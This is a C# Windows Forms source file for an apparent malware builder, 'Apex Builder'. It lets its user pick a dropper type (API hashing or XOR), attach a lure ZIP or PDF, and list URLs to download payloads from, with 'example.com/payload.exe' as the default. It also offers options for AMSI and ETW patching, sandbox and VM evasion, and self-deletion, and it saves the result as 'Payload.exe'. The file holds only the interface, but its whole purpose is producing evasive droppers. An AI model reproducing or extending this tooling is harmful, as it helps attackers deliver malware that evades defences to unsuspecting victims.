using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

namespace ApexBuilder
{
    public class MainForm : Form
    {
        private TabControl tabControl;
        public TextBox txtLureFile;
        public ComboBox cmbDropperType;
        public CheckBox chkAmsi, chkAntiVM, chkSelfDelete;
        public TextBox txtIconPath, txtLog;
        private Button btnBuild;
        
        // Dynamic URL components
        private FlowLayoutPanel flowUrls;
        private List<TextBox> urlFields = new List<TextBox>();

        public MainForm()
        {
            InitializeComponent();
        }

        private void InitializeComponent()
        {
            this.Text = "Apex Builder - Master Control Panel (v3 EXPERT)";
            this.Size = new Size(650, 600);
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;

            Color bgDark = Color.FromArgb(25, 25, 25);
            Color bgLighter = Color.FromArgb(45, 45, 45);
            Color accent = Color.FromArgb(180, 0, 0);
            Color textLight = Color.FromArgb(220, 220, 220);

            this.BackColor = bgDark;
            this.ForeColor = textLight;

            tabControl = new TabControl { Dock = DockStyle.Top, Height = 420 };
            tabControl.Appearance = TabAppearance.Normal;
            tabControl.Padding = new Point(12, 5);

            // Tab 1: Configuration
            TabPage tabConfig = new TabPage("Configuration");
            tabConfig.BackColor = bgDark;
            
            AddHeader(tabConfig, "Builder Type", 10);
            cmbDropperType = new ComboBox { Location = new Point(130, 10), Width = 180, DropDownStyle = ComboBoxStyle.DropDownList, BackColor = bgLighter, ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
            cmbDropperType.Items.AddRange(new object[] { "Ghost (API Hashing)", "Strong (Stable XOR)" });
            cmbDropperType.SelectedIndex = 0;
            tabConfig.Controls.Add(cmbDropperType);

            txtLureFile = CreateFileField(tabConfig, "Lure File (ZIP/PDF):", 50);

            // URls Section
            AddHeader(tabConfig, "Download URLs:", 90);
            Button btnAddUrl = new Button { Text = "+", Location = new Point(130, 88), Width = 30, Height = 25, BackColor = accent, ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
            btnAddUrl.Click += (s, e) => AddUrlField();
            tabConfig.Controls.Add(btnAddUrl);

            flowUrls = new FlowLayoutPanel { Location = new Point(10, 120), Width = 610, Height = 260, AutoScroll = true, FlowDirection = FlowDirection.TopDown, WrapContents = false };
            tabConfig.Controls.Add(flowUrls);

            // Add first URL by default
            AddUrlField("https://example.com/payload.exe");

            // Tab 2: Stealth
            TabPage tabStealth = new TabPage("Stealth & Evasion");
            tabStealth.BackColor = bgDark;
            
            chkAmsi = CreateCheckBox(tabStealth, "Patch AMSI & ETW (Memory Blinding)", 30);
            chkAntiVM = CreateCheckBox(tabStealth, "Anti-Sandbox / VM Evasion (Detectors)", 70);
            chkSelfDelete = CreateCheckBox(tabStealth, "Jedi Self-Deletion (Vanish on Exit)", 110);

            // Tab 3: Build
            TabPage tabBuild = new TabPage("Finalize");
            tabBuild.BackColor = bgDark;
            txtIconPath = CreateFileField(tabBuild, "Custom Icon (.ico):", 30);
            
            btnBuild = new Button { Text = "GENERATE APEX PAYLOAD", Location = new Point(200, 100), Width = 250, Height = 50, BackColor = accent, ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Font = new Font("Segoe UI", 10, FontStyle.Bold) };
            btnBuild.Click += BtnBuild_Click;
            tabBuild.Controls.Add(btnBuild);

            tabControl.TabPages.Add(tabConfig);
            tabControl.TabPages.Add(tabStealth);
            tabControl.TabPages.Add(tabBuild);

            this.Controls.Add(tabControl);

            txtLog = new TextBox { Dock = DockStyle.Bottom, Height = 140, Multiline = true, ReadOnly = true, ScrollBars = ScrollBars.Vertical, BackColor = Color.Black, ForeColor = Color.Lime, BorderStyle = BorderStyle.None, Font = new Font("Consolas", 9) };
            this.Controls.Add(txtLog);
            
            Log("Apex Builder v3 (EXPERT) Loaded.");
        }

        private void AddHeader(TabPage p, string text, int y)
        {
            p.Controls.Add(new Label { Text = text, Location = new Point(10, y + 3), Width = 110, Font = new Font("Segoe UI", 9, FontStyle.Bold) });
        }

        private CheckBox CreateCheckBox(TabPage p, string txt, int y)
        {
            CheckBox cb = new CheckBox { Text = txt, Location = new Point(30, y), Width = 400, Checked = true, Font = new Font("Segoe UI", 9) };
            p.Controls.Add(cb);
            return cb;
        }

        private void AddUrlField(string defaultVal = "")
        {
            Panel p = new Panel { Width = 580, Height = 35 };
            TextBox tb = new TextBox { Text = defaultVal, Location = new Point(0, 5), Width = 500, BackColor = Color.FromArgb(40, 40, 40), ForeColor = Color.White };
            Button btnDel = new Button { Text = "X", Location = new Point(510, 4), Width = 25, Height = 25, BackColor = Color.DarkGray, FlatStyle = FlatStyle.Flat };
            btnDel.Click += (s, e) => {
                if (urlFields.Count > 1) {
                    urlFields.Remove(tb);
                    flowUrls.Controls.Remove(p);
                }
            };
            p.Controls.Add(tb);
            p.Controls.Add(btnDel);
            flowUrls.Controls.Add(p);
            urlFields.Add(tb);
        }

        public List<string> GetUrls()
        {
            List<string> list = new List<string>();
            foreach (var tb in urlFields) if (!string.IsNullOrEmpty(tb.Text)) list.Add(tb.Text);
            return list;
        }

        private TextBox CreateFileField(TabPage parent, string labelText, int yPos)
        {
            parent.Controls.Add(new Label { Text = labelText, Location = new Point(10, yPos + 5), Width = 150 });
            TextBox tb = new TextBox { Location = new Point(160, yPos), Width = 350, BackColor = Color.FromArgb(40, 40, 40), ForeColor = Color.White };
            Button btn = new Button { Text = "...", Location = new Point(520, yPos - 1), Width = 40, Height = 25, BackColor = Color.Gray, FlatStyle = FlatStyle.Flat };
            btn.Click += (s, e) => {
                using (OpenFileDialog ofd = new OpenFileDialog()) {
                    if (ofd.ShowDialog() == DialogResult.OK) tb.Text = ofd.FileName;
                }
            };
            parent.Controls.Add(tb);
            parent.Controls.Add(btn);
            return tb;
        }

        public void Log(string msg)
        {
            txtLog.AppendText(string.Format("[{0}] {1}\r\n", DateTime.Now.ToString("HH:mm:ss"), msg));
        }

        private void BtnBuild_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtLureFile.Text)) {
                MessageBox.Show("Please select a Lure File (ZIP/PDF).", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            using (SaveFileDialog sfd = new SaveFileDialog()) {
                sfd.Filter = "Executable File (*.exe)|*.exe";
                sfd.Title = "Save Apex Payload As...";
                sfd.FileName = "Payload.exe";

                if (sfd.ShowDialog() == DialogResult.OK) {
                    Log("Build sequence initiated...");
                    CompilerHelper.Build(this, sfd.FileName);
                }
            }
        }
    }
}
